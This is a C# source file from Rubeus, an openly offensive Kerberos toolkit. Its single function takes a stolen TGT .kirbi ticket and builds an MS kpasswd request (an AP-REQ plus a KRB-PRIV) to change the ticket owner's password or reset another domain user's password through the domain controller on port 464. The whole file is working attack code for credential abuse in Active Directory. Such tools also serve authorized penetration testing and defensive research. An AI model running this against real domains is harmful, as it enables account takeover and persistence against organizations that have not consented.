b'\xef\xbb\xbfusing System;\nusing System.IO;\nusing System.Linq;\nusing System.Net;\nusing System.Text;\nusing Asn1;\n\nnamespace Rubeus\n{\n    public class Reset\n    {\n        [Flags]\n        enum PasswordProperties {\n            Complex = 0x1,\n            NoAnonChange = 0x2,\n            NoClearChange = 0x4,\n            LockoutAdmins = 0x8,\n            StoreCleartext = 0x10,\n            RefusePasswordChange = 0x20\n        }\n\n        public static void UserPassword(KRB_CRED kirbi, string newPassword, string domainController = "", string targetUser = null)\n        {\n            // implements the Kerberos-based password reset originally disclosed by Aorato\n            //      This function is misc::changepw in Kekeo\n            // Takes a valid TGT .kirbi and builds a MS Kpasswd password change sequence\n            //      AP-REQ with randomized sub session key\n            //      KRB-PRIV structure containing ChangePasswdData, enc w/ the sub session key\n            // reference: Microsoft Windows 2000 Kerberos Change Password and Set Password Protocols (RFC3244)\n\n            string dcIP = Networking.GetDCIP(domainController);\n            if (String.IsNullOrEmpty(dcIP)) { return; }\n\n            // extract the user and domain from the existing .kirbi ticket\n            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];\n            string userDomain = kirbi.enc_part.ticket_info[0].prealm;\n\n            if (targetUser == null) {\n                Console.WriteLine("[*] Changing password for user: {0}@{1}", userName, userDomain);\n            } else {\n                Console.WriteLine("[*] Resetting password for target user: {0}", targetUser);\n            }\n\n            Console.WriteLine("[*] New password value: {0}", newPassword);\n\n            // build the AP_REQ using the user ticket\'s keytype and key\n            Console.WriteLine("[*] Building AP-REQ for the MS Kpassword request");\n            AP_REQ ap_req = new AP_REQ(userDomain, userName, kirbi.tickets[0], kirbi.enc_part.ticket_info[0].key.keyvalue, (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype, Interop.KRB_KEY_USAGE_AP_REQ_AUTHENTICATOR);\n\n            // create a new session subkey for the Authenticator and match the encryption type of the user key\n            Console.WriteLine("[*] Building Authenticator with encryption key type: {0}", (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype);\n            ap_req.authenticator.subkey = new EncryptionKey();\n            ap_req.authenticator.subkey.keytype = kirbi.enc_part.ticket_info[0].key.keytype;\n\n            // generate a random session subkey\n            Random random = new Random();\n            byte[] randKeyBytes;\n            Interop.KERB_ETYPE randKeyEtype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;\n            if (randKeyEtype == Interop.KERB_ETYPE.rc4_hmac)\n            {\n                randKeyBytes = new byte[16];\n                random.NextBytes(randKeyBytes);\n                ap_req.authenticator.subkey.keyvalue = randKeyBytes;\n            }\n            else if (randKeyEtype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)\n            {\n                randKeyBytes = new byte[32];\n                random.NextBytes(randKeyBytes);\n                ap_req.authenticator.subkey.keyvalue = randKeyBytes;\n            }\n            else\n            {\n                Console.WriteLine("[X] Only rc4_hmac and aes256_cts_hmac_sha1 key hashes supported at this time!");\n                return;\n            }\n\n            Console.WriteLine("[*] base64(session subkey): {0}", Convert.ToBase64String(randKeyBytes));\n\n            // randKeyBytes is now the session key used for the KRB-PRIV structure\n\n            var rand = new Random();\n            ap_req.authenticator.seq_number = (UInt32)rand.Next(1, Int32.MaxValue);\n\n            // now build the KRV-PRIV structure\n            Console.WriteLine("[*] Building the KRV-PRIV structure");\n            KRB_PRIV changePriv = new KRB_PRIV(randKeyEtype, randKeyBytes);\n\n            // the new password to set for the user\n            if (targetUser != null) {\n                var userParts = targetUser.Split(\'\\\\\');\n                if(userParts.Length != 2) {\n                    Console.WriteLine("[X] /targetuser should be in the format domain.com\\\\username!");\n                    return;\n                }\n                changePriv.enc_part = new EncKrbPrivPart(userParts[1], userParts[0].ToUpper(), newPassword, "lol");\n            } else {\n                changePriv.enc_part = new EncKrbPrivPart(newPassword, "lol");\n            }\n\n            // now build the final MS Kpasswd request\n            byte[] apReqBytes = ap_req.Encode().Encode();\n            byte[] changePrivBytes = changePriv.Encode().Encode();\n\n            short messageLength = (short)(apReqBytes.Length + changePrivBytes.Length + 6);\n            short version = -128;\n\n            BinaryWriter bw = new BinaryWriter(new MemoryStream());\n\n            //Message Length\n            bw.Write(IPAddress.NetworkToHostOrder(messageLength));\n\n            // Version (Reply)\n            bw.Write(IPAddress.NetworkToHostOrder(version));\n\n            //AP_REQ Length\n            bw.Write(IPAddress.NetworkToHostOrder((short)apReqBytes.Length));\n\n            //AP_REQ\n            bw.Write(apReqBytes);\n\n            //KRV-PRIV\n            bw.Write(changePrivBytes);\n            \n            // KPASSWD_DEFAULT_PORT = 464\n            byte[] response = Networking.SendBytes(dcIP, 464, ((MemoryStream)bw.BaseStream).ToArray());\n            if (response == null)\n            {\n                return;\n            }\n\n            try\n            {\n                AsnElt responseAsn = AsnElt.Decode(response, false);\n\n                // check the response value\n                int responseTag = responseAsn.TagValue;\n\n                if (responseTag == 30)\n                {\n                    // parse the response to an KRB-ERROR\n                    KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);\n                    Console.WriteLine("\\r\\n[X] KRB-ERROR ({0}) : {1}\\r\\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);\n                    return;\n                }\n            }\n            catch { }\n\n            // otherwise parse the resulting KRB-PRIV from the server\n            BinaryReader br = new BinaryReader(new MemoryStream(response));\n            short respMsgLen = IPAddress.NetworkToHostOrder(br.ReadInt16());\n            short respVersion = IPAddress.NetworkToHostOrder(br.ReadInt16());\n            short respAPReqLen = IPAddress.NetworkToHostOrder(br.ReadInt16());\n            byte[] respAPReq = br.ReadBytes(respAPReqLen);\n            byte[] respKRBPriv = br.ReadBytes((int)(br.BaseStream.Length - br.BaseStream.Position));\n\n            // decode the KRB-PRIV response\n            AsnElt respKRBPrivAsn = AsnElt.Decode(respKRBPriv, false);\n\n            foreach(AsnElt elem in respKRBPrivAsn.Sub[0].Sub)\n            {\n                if(elem.TagValue == 3)\n                {\n                    byte[] encBytes = elem.Sub[0].Sub[1].GetOctetString();\n                    byte[] decBytes = Crypto.KerberosDecrypt(randKeyEtype, Interop.KRB_KEY_USAGE_KRB_PRIV_ENCRYPTED_PART, randKeyBytes, encBytes);\n                    AsnElt decBytesAsn = AsnElt.Decode(decBytes, false);\n\n                    byte[] responseCodeBytes = decBytesAsn.Sub[0].Sub[0].Sub[0].GetOctetString();\n\n                    br = new BinaryReader(new MemoryStream(responseCodeBytes));\n                    short resultCode = IPAddress.NetworkToHostOrder(br.ReadInt16());                            \n                    if (resultCode == 0)\n                    {\n                        Console.WriteLine("[+] Password change success!");\n                    }\n                    else\n                    {\n                        byte[] resultMessage = br.ReadBytes((int)(br.BaseStream.Length - br.BaseStream.Position));\n                        string resultError = "";\n\n                        if (resultMessage.Length > 2) {\n                            if (resultMessage[0] == 0 && resultMessage[1] == 0) {\n                                br = new BinaryReader(new MemoryStream(resultMessage));\n                                br.ReadUInt16();\n                                int minPasswordLen = IPAddress.NetworkToHostOrder(br.ReadInt32());\n                                int passwordHistory = IPAddress.NetworkToHostOrder(br.ReadInt32());\n                                PasswordProperties pprops = (PasswordProperties)IPAddress.NetworkToHostOrder((br.ReadInt32()));\n                                TimeSpan expire = TimeSpan.FromTicks(IPAddress.NetworkToHostOrder(br.ReadInt64()));\n                                TimeSpan min_passwordage = TimeSpan.FromTicks(IPAddress.NetworkToHostOrder(br.ReadInt64()));\n                                resultError = $"Policy: \\n\\tMinimum Length: {minPasswordLen}\\n\\tPassword History: {passwordHistory}\\n\\tFlags: {pprops}\\n\\tExpiry: {expire:%d} day(s)\\n\\tMinimum Password Age: {min_passwordage:%d} day(s)";\n\n                            } else {\n                                resultError = Encoding.UTF8.GetString(resultMessage);\n                            }\n                        }\n\n                        Console.WriteLine("[X] Password change error: {0} {1}", (Interop.KADMIN_PASSWD_ERR)resultCode, resultError);\n                    }\n                }\n            }\n        }\n    }\n}'